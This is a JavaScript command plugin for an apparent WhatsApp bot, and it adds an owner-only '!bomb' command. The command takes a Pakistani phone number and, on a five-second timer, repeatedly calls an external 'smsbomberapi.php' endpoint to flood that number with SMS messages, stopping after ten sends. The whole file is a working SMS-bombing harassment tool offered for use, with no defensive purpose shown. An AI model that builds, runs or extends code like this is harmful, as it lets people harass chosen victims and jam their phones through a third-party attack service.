const { cmd } = require('../command');
let isBombing = false;
let bombingInterval;

cmd({
    pattern: "bomb",
    react: "💣",
    desc: "Start/Stop SMS Bombing",
    category: "main",
    filename: __filename
}, async (conn, mek, m, { from, isOwner, text, reply }) => {
    if (!isOwner) return reply("❌ Owner only!");

    // STOP if already running
    if (isBombing) {
        clearInterval(bombingInterval);
        isBombing = false;
        return reply("✅ Bombing stopped!");
    }

    // Extract & Validate Number
    const number = text.split(' ')[1]?.replace(/[^0-9]/g, '');
    if (!number || !number.startsWith('92') || number.length < 11) {
        return reply("❌ Invalid PK number! Usage: !bomb 923001234567");
    }

    // Start Bombing
    isBombing = true;
    let sent = 0;
    reply(`💣 *Bombing Started!*\nTarget: ${number}`);

    bombingInterval = setInterval(async () => {
        if (!isBombing || sent >= 10) { // Max 10 SMS
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`✅ Sent ${sent} SMS!`);
            return;
        }

        try {
            const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
            const response = await fetch(apiUrl);
            const result = await response.text();
            console.log("API Response:", result); // Debugging

            if (!result.includes("Success")) {
                throw new Error("API ne Success nahi bheja!");
            }
            sent++;
            
        } catch (err) {
            console.error("Error:", err);
            clearInterval(bombingInterval);
            isBombing = false;
            reply(`❌ Failed: ${err.message}`);
        }
    }, 5000); // 5-second delay
});
